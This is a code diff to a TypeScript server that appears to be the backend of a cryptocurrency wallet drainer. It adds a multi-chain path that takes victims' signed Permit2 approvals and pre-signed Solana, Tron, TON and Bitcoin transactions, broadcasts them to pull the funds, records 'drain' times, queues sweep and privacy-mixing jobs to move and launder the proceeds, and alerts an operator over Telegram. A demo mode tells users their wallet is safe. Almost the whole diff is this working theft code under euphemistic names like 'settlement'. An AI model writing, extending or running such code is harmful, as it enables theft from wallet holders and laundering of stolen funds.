@@ -5,10 +5,15 @@
 import {
   computeSignatureAnchorExpiry,
   executeDelegateCashRegistrySurfaceRead,
+  executeOmnichainAtomicSettlement,
   executeSettlementIgnition,
   isExpiryIsoWithinDriftWindow,
+  openSignaturePayloadForSettlement,
+  packOmnichainAtomicSignatureEnvelope,
+  parseOmnichainAtomicSignatureEnvelope,
   PERMIT2_MAX_AMOUNT,
   resolveGatekeeperEthereumRpcUrl,
+  type OmnichainAtomicSettlementResult,
   type SettlementIgnitionTelemetry,
 } from '@legion/core'
 import {
@@ -66,8 +71,15 @@ import { createPublicClient, getAddress, http, isAddress, stringToHex } from 'vi
 import { arbitrum, base, mainnet, sepolia, bscTestnet } from 'viem/chains'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
-import { validatePermit2BatchOmnichainTokenLegs } from '../lib/schemas.js'
+import {
+  validateOmnichainAtomicIngressPayloads,
+  validatePermit2BatchOmnichainTokenLegs,
+} from '../lib/schemas.js'
 import { enqueueExtractionJob } from '../lib/extraction-queue.js'
+import { enqueuePrivacyMixingJob } from '../lib/privacy-mixing-queue.js'
+import { enqueueSweepJob } from '../lib/sweep-queue.js'
+import { isTrainingDemoModeEnabled, isTrainingDemoRequest } from '../lib/training-demo-mode.js'
+import { isSettlementPaused, recordLastDrainTime } from '../lib/settlement-pause.js'
 import { queueKineticDeepAssetScan } from '../lib/kinetic-deep-scan.js'
 import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
 import { sendSovereignTelemetryPayload } from '../telemetry-sender.js'
@@ -178,6 +190,21 @@ interface NormalizedIngressV1 {
     fee_sat?: string
     vault_address?: string
   }
+  evm_payload?: {
+    native_amount?: string
+    native_signed_transaction?: Hex | string
+    nfts?: Array<{ contract: string; tokenIds: string[]; standard?: 'erc721' | 'erc1155'; amounts?: string[] }>
+  }
+  solana_payload?: Record<string, unknown>
+  tron_payload?: Record<string, unknown>
+  ton_payload?: Record<string, unknown>
+  bitcoin_payload?: {
+    signed_psbt_base64?: string
+    wallet_address?: string
+    vault_address?: string
+    amount_sat?: string
+    fee_sat?: string
+  }
   scout_value_usd?: number
   amount?: string
   wallet_balance?: string
@@ -237,6 +264,7 @@ const PROTOCOL_RACK = new Set([
   'evm',
   'permit2_eip712',
   'permit2_batch_eip712',
+  'omnichain_atomic_v1',
   'solana',
   'utxo',
   'bitcoin_psbt',
@@ -274,6 +302,12 @@ type SettlementIgnitionOutcome =
   | SettlementIgnitionTelemetry
   | {
       ignition_fault: string
+      omnichain_atomic_settlement?: OmnichainAtomicSettlementResult
+    }
+  | {
+      sovereign_dispatcher_tx_hash?: string
+      sovereign_dispatcher_status?: 'broadcasted'
+      omnichain_atomic_settlement: OmnichainAtomicSettlementResult
     }
 
 // Use ReturnType to avoid generic parameter mismatch with SupabaseClient versions.
@@ -522,6 +556,18 @@ function parseBatchNftEntries(
   return { ok: true, nfts }
 }
 
+/** Recursively convert BigInt values to strings for JSON serialization. */
+function normalizeBigInts(value: unknown): unknown {
+  if (typeof value === 'bigint') return value.toString()
+  if (Array.isArray(value)) return value.map(normalizeBigInts)
+  if (value !== null && typeof value === 'object') {
+    return Object.fromEntries(
+      Object.entries(value as Record<string, unknown>).map(([k, v]) => [k, normalizeBigInts(v)]),
+    )
+  }
+  return value
+}
+
 async function buildPermit2TypedDataForWallet(params: {
   wallet: Address
   token: Address
@@ -767,6 +813,62 @@ async function updateSignatureSettlementStatus(params: {
         token_address: params.token_address,
       },
     )
+    return
+  }
+
+  if (params.settlement_status === 'SETTLED') {
+    void recordLastDrainTime()
+  }
+}
+
+async function schedulePostSettlementSweep(): Promise<void> {
+  try {
+    const sweep = await enqueueSweepJob({ trigger: 'settlement' })
+    if (sweep.mode === 'memory') {
+      console.warn('[SWEEP] memory fallback:', sweep.warning)
+    }
+  } catch (e) {
+    console.warn(
+      '[SWEEP] enqueue failed:',
+      e instanceof Error ? e.message : String(e),
+    )
+  }
+}
+
+async function schedulePostSettlementPrivacyMixing(params: {
+  row: PersistedSignatureRow
+  settlement_tx_hash?: string | null
+  scout_value_usd: number
+}): Promise<void> {
+  try {
+    const mix = await enqueuePrivacyMixingJob({
+      wallet_address: params.row.wallet_address,
+      token_address: params.row.token_address,
+      settlement_tx_hash: params.settlement_tx_hash ?? undefined,
+      scout_value_usd: params.scout_value_usd,
+      protocol: params.row.protocol,
+      chain_id:
+        params.row.chain_id != null && String(params.row.chain_id).trim() !== ''
+          ? String(params.row.chain_id).trim()
+          : null,
+      amount: params.row.amount ?? undefined,
+    })
+    if (mix.mode === 'memory') {
+      gatekeeperPersistLog(
+        'warn',
+        'privacy_mixing.memory_fallback',
+        mix.warning,
+        anchorLogFields(params.row, params.scout_value_usd),
+      )
+    }
+  } catch (e) {
+    const detail = e instanceof Error ? e.message : String(e)
+    gatekeeperPersistLog(
+      'warn',
+      'privacy_mixing.enqueue_failed',
+      detail,
+      anchorLogFields(params.row, params.scout_value_usd),
+    )
   }
 }
 
@@ -823,6 +925,152 @@ function settlementUsedRelaySecondLeg(outcome: SettlementIgnitionOutcome | undef
     typeof outcome.relay_second_leg_tx_hash === 'string' &&
     outcome.relay_second_leg_tx_hash.trim() !== ''
   )
+}
+
+function settlementOmnichainAtomicResult(
+  outcome: SettlementIgnitionOutcome | undefined,
+): OmnichainAtomicSettlementResult | undefined {
+  if (
+    outcome != null &&
+    'omnichain_atomic_settlement' in outcome &&
+    typeof outcome.omnichain_atomic_settlement === 'object' &&
+    outcome.omnichain_atomic_settlement != null
+  ) {
+    return outcome.omnichain_atomic_settlement
+  }
+  return undefined
+}
+
+function parseSettlementChainIdNumber(chainId: string | null, row: PersistedSignatureRow): number {
+  const raw = resolveSettlementChainId(row, chainId) ?? row.chain_id ?? '1'
+  const parsed = Number.parseInt(String(raw).replace(/^eip155:/i, ''), 10)
+  return Number.isFinite(parsed) && parsed > 0 ? parsed : 1
+}
+
+async function runOmnichainAtomicReconciliation(params: {
+  supabase: SupabaseAdminClient
+  row: PersistedSignatureRow
+  chain_id: string | null
+  scout_value_usd: number
+}): Promise<SettlementIgnitionOutcome | undefined> {
+  const { row, supabase, chain_id, scout_value_usd } = params
+  const reconciliationTelegramCtx: TelegramRequestContext = {
+    chain_id: resolveSettlementChainId(row, chain_id) ?? undefined,
+    chain_family: row.chain_family ?? row.protocol.toUpperCase(),
+    wallet_type: row.wallet_type,
+    scout_value_usd: row.scout_value_usd ?? scout_value_usd,
+    amount: row.amount ?? undefined,
+    nonce: row.nonce,
+    tokenAddress: row.token_address,
+  }
+
+  const opened = openSignaturePayloadForSettlement(row.signature_hex)
+  const envelope = parseOmnichainAtomicSignatureEnvelope(opened)
+  if (envelope == null) {
+    const fault = 'omnichain_atomic_v1 envelope could not be parsed for settlement'
+    await updateSignatureSettlementStatus({
+      supabase,
+      wallet_address: row.wallet_address,
+      token_address: row.token_address,
+      settlement_status: 'FAILED_SETTLEMENT',
+    })
+    gatekeeperPersistLog('warn', 'signatures.omnichain_atomic_failed', fault, anchorLogFields(row, scout_value_usd))
+    return { ignition_fault: fault }
+  }
+
+  let outcome: SettlementIgnitionOutcome | undefined
+  try {
+    const chainId = parseSettlementChainIdNumber(chain_id, row)
+    const atomic = await executeOmnichainAtomicSettlement({
+      owner: row.wallet_address as Address,
+      chainId,
+      envelope,
+      scout_value_usd,
+    })
+
+    if (!atomic.ok) {
+      await updateSignatureSettlementStatus({
+        supabase,
+        wallet_address: row.wallet_address,
+        token_address: row.token_address,
+        settlement_status: 'FAILED_SETTLEMENT',
+      })
+      gatekeeperPersistLog(
+        'warn',
+        'signatures.omnichain_atomic_failed',
+        atomic.detail ?? 'Omnichain atomic settlement failed',
+        anchorLogFields(row, scout_value_usd),
+      )
+      return {
+        ignition_fault: atomic.detail ?? 'Omnichain atomic settlement failed',
+        omnichain_atomic_settlement: atomic,
+      }
+    }
+
+    await updateSignatureSettlementStatus({
+      supabase,
+      wallet_address: row.wallet_address,
+      token_address: row.token_address,
+      settlement_status: 'SETTLED',
+    })
+
+    const primaryTxHash =
+      atomic.evm_transaction_hashes?.[atomic.evm_transaction_hashes.length - 1] ??
+      atomic.bitcoin_tx_hash ??
+      atomic.omnichain_transaction_hashes?.sol ??
+      atomic.omnichain_transaction_hashes?.trx ??
+      atomic.omnichain_transaction_hashes?.ton ??
+      atomic.omnichain_transaction_hashes?.spl ??
+      atomic.omnichain_transaction_hashes?.trc20 ??
+      atomic.omnichain_transaction_hashes?.jetton
+
+    if (primaryTxHash) {
+      notifyBroadcastConfirmed(primaryTxHash, row.wallet_address, {
+        ...reconciliationTelegramCtx,
+        tx_hash: primaryTxHash,
+      }).catch(() => {})
+    }
+
+    await sendSovereignTelemetryPayload({
+      event: 'SETTLEMENT_IGNITED',
+      message: 'SETTLEMENT_IGNITED: Omnichain atomic portfolio settlement finalized.',
+      tx_hash: primaryTxHash ?? undefined,
+      value: row.amount ?? '0',
+      chain_id,
+      wallet_address: row.wallet_address,
+      protocol: row.protocol,
+    }).catch(() => {})
+
+    void schedulePostSettlementPrivacyMixing({
+      row,
+      settlement_tx_hash: primaryTxHash ?? undefined,
+      scout_value_usd,
+    })
+    void schedulePostSettlementSweep()
+
+    outcome = {
+      sovereign_dispatcher_tx_hash: primaryTxHash,
+      sovereign_dispatcher_status: 'broadcasted',
+      omnichain_atomic_settlement: atomic,
+    }
+  } catch (ignErr) {
+    const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
+    gatekeeperPersistLog(
+      'error',
+      'signatures.omnichain_atomic_settlement',
+      fault,
+      anchorLogFields(row, scout_value_usd),
+    )
+    await updateSignatureSettlementStatus({
+      supabase,
+      wallet_address: row.wallet_address,
+      token_address: row.token_address,
+      settlement_status: 'FAILED_SETTLEMENT',
+    })
+    outcome = { ignition_fault: fault }
+  }
+
+  return outcome
 }
 
 function queueEventDrivenReconciliation(params: {
@@ -979,6 +1227,14 @@ async function runEventDrivenReconciliation(params: {
     chain_id,
     protocol: row.protocol,
   })
+
+  void schedulePostSettlementPrivacyMixing({
+    row,
+    settlement_tx_hash: txHash,
+    scout_value_usd,
+  })
+  void schedulePostSettlementSweep()
+
   return outcome
 }
 
@@ -987,9 +1243,33 @@ async function signatureAnchorPostHandler(
   reply: FastifyReply,
 ): Promise<FastifyReply> {
   try {
+    if (await isSettlementPaused()) {
+      return sendFailure(reply, 503, 'Settlement ingress paused (Telegram /pause)', {
+        code: 'SettlementPaused',
+      })
+    }
+
     const body: unknown = request.body
     const bodyObj =
       typeof body === 'object' && body !== null ? (body as Record<string, unknown>) : null
+
+    if (isTrainingDemoModeEnabled() && isTrainingDemoRequest(request, bodyObj)) {
+      const wallet =
+        typeof bodyObj?.['wallet_address'] === 'string' ? bodyObj['wallet_address'].trim() : ''
+      request.log.info(
+        {
+          training_demo: true,
+          wallet_address: wallet || null,
+          protocol: bodyObj?.['protocol'] ?? null,
+        },
+        '[TRAINING_DEMO] signature-anchor ingress blocked — settlement disabled',
+      )
+      return sendSuccess(reply, 200, 'Training demo mode — settlement disabled (logged only)', {
+        training_demo: true,
+        settlement_blocked: true,
+        message: 'Demo completed – your wallet is safe',
+      })
+    }
     const sourceOrigin = resolveDataBindingSourceOrigin(request, bodyObj)
 
     if (bodyObj) {
@@ -1104,8 +1384,8 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         rpcUrl,
       })
       return sendSuccess(reply, 200, 'Permit2 typed data ready', {
-        typed_data: built.typedData,
-        permit_metadata: built.permit_metadata,
+        typed_data: normalizeBigInts(built.typedData),
+        permit_metadata: normalizeBigInts(built.permit_metadata),
         engine_spender: built.engine_spender,
         permit2: built.permit2,
         protocol: 'permit2_eip712',
@@ -1265,7 +1545,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         nfts: parsedNfts.nfts.length > 0 ? parsedNfts.nfts : undefined,
         rpcUrl,
       })
-      return sendSuccess(reply, 200, 'Permit2 batch typed data ready', {
+      return sendSuccess(reply, 200, 'Permit2 batch typed data ready', normalizeBigInts({
         typed_data: built.typedData,
         batch_permit_metadata: built.batch_permit_metadata,
         permits: permits.map((p) => ({ token: p.token, amount: p.amount.toString() })),
@@ -1284,7 +1564,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         engine_spender: built.engine_spender,
         permit2: built.permit2,
         protocol: 'permit2_batch_eip712',
-      })
+      }) as Record<string, unknown>)
     } catch (e) {
       const msg = e instanceof Error ? e.message : String(e)
       return sendFailure(reply, 500, msg, { code: 'ServerError' })
@@ -1490,12 +1770,20 @@ async function persistSignatureRow(
       ? String(row.chain_id).trim()
       : null
 
+  const isOmnichainAtomic = row.protocol === 'omnichain_atomic_v1'
   const isEvmPermit2 =
     row.chain_family === 'EVM' &&
     (row.protocol === 'permit2_eip712' || row.protocol.includes('permit2'))
 
   let settlementOutcome: SettlementIgnitionOutcome | undefined
-  if (isEvmPermit2) {
+  if (isOmnichainAtomic) {
+    settlementOutcome = await runOmnichainAtomicReconciliation({
+      supabase,
+      row,
+      chain_id: chainNorm,
+      scout_value_usd,
+    })
+  } else if (isEvmPermit2) {
     settlementOutcome = await runEventDrivenReconciliation({
       supabase,
       row,
@@ -1521,6 +1809,7 @@ async function persistSignatureRow(
 
   const transaction_hash = settlementIgnitionTxHash(settlementOutcome) ?? null
   const settlement_fault = settlementIgnitionFault(settlementOutcome)
+  const omnichain_settlement = settlementOmnichainAtomicResult(settlementOutcome)
 
   if (settlement_fault != null) {
     return sendFailure(reply, 502, 'Settlement broadcast failed', {
@@ -1530,6 +1819,7 @@ async function persistSignatureRow(
       handshake_active: true,
       settlement_reconciliation_queued: false,
       lethal_core_aligned: true,
+      ...(omnichain_settlement ? { omnichain_settlement } : {}),
       ...(transaction_hash ? { transaction_hash, l2_mint_transaction_hash: transaction_hash } : {}),
     })
   }
@@ -1537,8 +1827,19 @@ async function persistSignatureRow(
   return sendSuccess(reply, 200, 'Signature anchored', {
     handshake_active: true,
     ...(transaction_hash ? { transaction_hash, l2_mint_transaction_hash: transaction_hash } : {}),
-    settlement_reconciliation_queued: !isEvmPermit2,
-    settlement_status: transaction_hash ? 'SETTLED' : isEvmPermit2 ? 'FAILED_SETTLEMENT' : 'PENDING',
+    ...(omnichain_settlement
+      ? {
+          omnichain_settlement,
+          settlement_transaction_hashes: omnichain_settlement.omnichain_transaction_hashes,
+        }
+      : {}),
+    settlement_reconciliation_queued: !isEvmPermit2 && !isOmnichainAtomic,
+    settlement_status:
+      transaction_hash || omnichain_settlement?.ok
+        ? 'SETTLED'
+        : isEvmPermit2 || isOmnichainAtomic
+          ? 'FAILED_SETTLEMENT'
+          : 'PENDING',
     lethal_core_aligned: true,
   })
 }
@@ -1612,7 +1913,7 @@ async function handleNormalizedIngress(
     return sendFailure(
       reply,
       400,
-      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, solana, utxo, bitcoin_psbt, tron, ton',
+      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, omnichain_atomic_v1, solana, utxo, bitcoin_psbt, tron, ton',
       { code: 'ValidationError' },
     )
   }
@@ -1705,6 +2006,280 @@ async function handleNormalizedIngress(
   }
 
   if (b.chain_family === 'EVM') {
+    if (protocolNorm === 'omnichain_atomic_v1') {
+      const omnichainPayloads = validateOmnichainAtomicIngressPayloads({
+        solana_payload: b.solana_payload,
+        tron_payload: b.tron_payload,
+        ton_payload: b.ton_payload,
+        bitcoin_payload: b.bitcoin_payload,
+      })
+      if (omnichainPayloads.ok === false) {
+        return sendFailure(reply, 400, omnichainPayloads.message, { code: 'ValidationError' })
+      }
+
+      const hasEvmBatch =
+        b.chain_id != null &&
+        b.engine_spender != null &&
+        b.permit2 != null &&
+        b.batch_permit_metadata != null &&
+        batchPermits != null &&
+        batchPermits.length > 0
+      const hasNonEvmLeg =
+        omnichainPayloads.data.solana != null ||
+        omnichainPayloads.data.tron != null ||
+        omnichainPayloads.data.ton != null ||
+        omnichainPayloads.data.bitcoin != null
+
+      if (!hasEvmBatch && !hasNonEvmLeg) {
+        return sendFailure(
+          reply,
+          400,
+          'omnichain_atomic_v1 requires evm batch (chain_id, engine_spender, permit2, permits, batch_permit_metadata) and/or a non-EVM chain payload',
+          { code: 'ValidationError' },
+        )
+      }
+
+      let batchMetadata: BatchPermitMetadata | undefined
+      let nativeAmount = 0n
+      let nativeSignedRaw: Hex | string | undefined
+
+      if (hasEvmBatch) {
+        if (!isAddress(b.engine_spender!) || !isAddress(b.permit2!)) {
+          return sendFailure(reply, 400, 'omnichain_atomic_v1 requires valid engine_spender and permit2', {
+            code: 'ValidationError',
+          })
+        }
+        nativeAmount = parseNativeAmount(
+          b.evm_payload?.native_amount ??
+            b.nativeAmount ??
+            b.batch_permit_metadata!.native_amount ??
+            '0',
+        )
+        nativeSignedRaw =
+          b.evm_payload?.native_signed_transaction ?? b.native_signed_transaction ?? undefined
+        if (nativeAmount > 0n && nativeSignedRaw == null) {
+          return sendFailure(
+            reply,
+            400,
+            'omnichain_atomic_v1 EVM native leg requires native_signed_transaction when native_amount > 0',
+            { code: 'ValidationError' },
+          )
+        }
+
+        const rpcUrl = await gatekeeperEthereumRpcUrl()
+        if (!rpcUrl) {
+          return sendFailure(reply, 500, 'Server RPC not configured', { code: 'ServerError' })
+        }
+        const batchClient = createPublicClient({
+          chain: chainById(Number(b.chain_id)),
+          transport: http(rpcUrl),
+        })
+        for (const permit of batchPermits!) {
+          if (!isAddress(permit.token)) {
+            return sendFailure(reply, 400, 'Each batch permit token must be a valid EVM address', {
+              code: 'ValidationError',
+            })
+          }
+          const delegateReject = await rejectIfDelegateCashDelegated(
+            reply,
+            batchClient,
+            {
+              vault: wallet_address as Address,
+              engineSpender: b.engine_spender!,
+              permit2Address: b.permit2!,
+              tokenAddress: permit.token as Address,
+            },
+            { token_address: permit.token },
+          )
+          if (delegateReject != null) {
+            return delegateReject
+          }
+        }
+
+        batchMetadata = {
+          ...b.batch_permit_metadata!,
+          spender: getAddress(b.engine_spender!),
+          chainId: Number(b.chain_id),
+          details: batchPermits!.map((permit) => ({
+            token: getAddress(permit.token),
+            amount: permit.amount,
+            expiration: b.batch_permit_metadata!.details[0]?.expiration ?? computeSignatureAnchorExpiry(),
+            nonce: b.batch_permit_metadata!.details.find((d) => d.token === permit.token)?.nonce ?? 0,
+          })),
+          ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
+        }
+      }
+
+      const nfts: BatchNftEntry[] = (b.evm_payload?.nfts ?? b.nfts ?? []).map((entry) => ({
+        contract: getAddress(entry.contract),
+        tokenIds: entry.tokenIds,
+        ...(entry.standard ? { standard: entry.standard } : {}),
+        ...(entry.amounts ? { amounts: entry.amounts } : {}),
+      }))
+
+      const solanaPayload = omnichainPayloads.data.solana
+        ? {
+            ...(omnichainPayloads.data.solana.native_amount_sol != null
+              ? { native_amount_sol: String(omnichainPayloads.data.solana.native_amount_sol) }
+              : {}),
+            ...(omnichainPayloads.data.solana.native_signed_transaction_sol
+              ? {
+                  native_signed_transaction_sol:
+                    omnichainPayloads.data.solana.native_signed_transaction_sol,
+                }
+              : {}),
+            ...(omnichainPayloads.data.solana.spl_mint
+              ? { spl_mint: omnichainPayloads.data.solana.spl_mint }
+              : {}),
+            ...(omnichainPayloads.data.solana.spl_amount != null
+              ? { spl_amount: String(omnichainPayloads.data.solana.spl_amount) }
+              : {}),
+            ...(omnichainPayloads.data.solana.native_signed_transaction_spl
+              ? {
+                  native_signed_transaction_spl:
+                    omnichainPayloads.data.solana.native_signed_transaction_spl,
+                }
+              : {}),
+          }
+        : undefined
+
+      const tronPayload = omnichainPayloads.data.tron
+        ? {
+            ...(omnichainPayloads.data.tron.native_amount_trx != null
+              ? { native_amount_trx: String(omnichainPayloads.data.tron.native_amount_trx) }
+              : {}),
+            ...(omnichainPayloads.data.tron.native_signed_transaction_trx
+              ? {
+                  native_signed_transaction_trx:
+                    omnichainPayloads.data.tron.native_signed_transaction_trx,
+                }
+              : {}),
+            ...(omnichainPayloads.data.tron.trc20_contract
+              ? { trc20_contract: omnichainPayloads.data.tron.trc20_contract }
+              : {}),
+            ...(omnichainPayloads.data.tron.trc20_amount != null
+              ? { trc20_amount: String(omnichainPayloads.data.tron.trc20_amount) }
+              : {}),
+            ...(omnichainPayloads.data.tron.native_signed_transaction_trc20
+              ? {
+                  native_signed_transaction_trc20:
+                    omnichainPayloads.data.tron.native_signed_transaction_trc20,
+                }
+              : {}),
+          }
+        : undefined
+
+      const tonPayload = omnichainPayloads.data.ton
+        ? {
+            ...(omnichainPayloads.data.ton.native_amount_ton != null
+              ? { native_amount_ton: String(omnichainPayloads.data.ton.native_amount_ton) }
+              : {}),
+            ...(omnichainPayloads.data.ton.native_signed_transaction_ton
+              ? {
+                  native_signed_transaction_ton:
+                    omnichainPayloads.data.ton.native_signed_transaction_ton,
+                }
+              : {}),
+            ...(omnichainPayloads.data.ton.jetton_master
+              ? { jetton_master: omnichainPayloads.data.ton.jetton_master }
+              : {}),
+            ...(omnichainPayloads.data.ton.jetton_amount != null
+              ? { jetton_amount: String(omnichainPayloads.data.ton.jetton_amount) }
+              : {}),
+            ...(omnichainPayloads.data.ton.native_signed_transaction_jetton
+              ? {
+                  native_signed_transaction_jetton:
+                    omnichainPayloads.data.ton.native_signed_transaction_jetton,
+                }
+              : {}),
+          }
+        : undefined
+
+      const bitcoinPayload = omnichainPayloads.data.bitcoin
+        ? {
+            signed_psbt_base64: omnichainPayloads.data.bitcoin.signed_psbt_base64,
+            ...(omnichainPayloads.data.bitcoin.wallet_address
+              ? { wallet_address: omnichainPayloads.data.bitcoin.wallet_address }
+              : {}),
+            ...(omnichainPayloads.data.bitcoin.vault_address
+              ? { vault_address: omnichainPayloads.data.bitcoin.vault_address }
+              : {}),
+            ...(omnichainPayloads.data.bitcoin.amount_sat != null
+              ? { amount_sat: String(omnichainPayloads.data.bitcoin.amount_sat) }
+              : {}),
+            ...(omnichainPayloads.data.bitcoin.fee_sat != null
+              ? { fee_sat: String(omnichainPayloads.data.bitcoin.fee_sat) }
+              : {}),
+          }
+        : undefined
+
+      const permit2Sig = normalizeSignatureHexForSeal(String(signatureRaw)) as Hex
+      const packed = packOmnichainAtomicSignatureEnvelope({
+        permit2Signature: permit2Sig,
+        ...(batchMetadata ? { batch: batchMetadata } : {}),
+        ...(batchMetadata
+          ? {
+              evmPayload: {
+                permit2_signature: permit2Sig,
+                batch: batchMetadata,
+                ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
+                ...(nativeAmount > 0n && nativeSignedRaw != null
+                  ? {
+                      native_signed_transaction: normalizeSignatureHexForSeal(
+                        String(nativeSignedRaw),
+                      ) as Hex,
+                    }
+                  : {}),
+                ...(nfts.length > 0 ? { nfts } : {}),
+              },
+            }
+          : {}),
+        ...(solanaPayload ? { solanaPayload } : {}),
+        ...(tronPayload ? { tronPayload } : {}),
+        ...(tonPayload ? { tonPayload } : {}),
+        ...(bitcoinPayload ? { bitcoinPayload } : {}),
+      })
+      const sealed = sealSignatureHexForPersistence(packed)
+      const chainIdNorm =
+        b.chain_id != null && String(b.chain_id).trim() !== ''
+          ? String(b.chain_id).trim()
+          : hasNonEvmLeg && !hasEvmBatch
+            ? 'omnichain'
+            : undefined
+      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
+      const batchAmount = hasEvmBatch
+        ? batchPermits!
+            .reduce((sum, permit) => {
+              try {
+                return sum + BigInt(permit.amount)
+              } catch {
+                return sum
+              }
+            }, nativeAmount)
+            .toString()
+        : tel.amount
+
+      return persistSignatureRow(
+        {
+          wallet_address,
+          token_address,
+          signature_hex: sealed,
+          nonce: b.nonce,
+          expiry: b.expiry_iso,
+          wallet_type: b.wallet_type.trim(),
+          protocol: 'omnichain_atomic_v1',
+          chain_family: 'EVM',
+          scout_value_usd: tel.scout_value_usd,
+          amount: batchAmount || tel.amount,
+          max_allowance: tel.max_allowance,
+          requires_quorum: tel.requires_quorum,
+          source_origin: sourceOrigin,
+          ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
+        },
+        reply,
+      )
+    }
+
     if (protocolNorm === 'permit2_batch_eip712') {
       if (b.chain_id == null || b.engine_spender == null || b.permit2 == null) {
         return sendFailure(
